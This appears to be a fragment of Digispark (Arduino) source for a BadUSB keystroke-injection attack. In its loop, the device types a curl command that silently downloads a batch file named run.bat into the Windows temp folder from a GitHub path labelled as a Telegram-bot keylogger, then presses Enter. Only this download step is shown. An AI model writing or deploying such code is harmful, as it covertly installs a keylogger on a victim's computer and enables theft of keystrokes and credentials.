...
void loop() {
  ...
  DigiKeyboard.print("curl -o \"%TEMP%\\run.bat\" \"https://raw.githubusercontent.com/0xAbolfazl/BadUSB/refs/heads/master/Digispark/KeyLogger/UsingTelegramBot/run.bat\" --silent");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
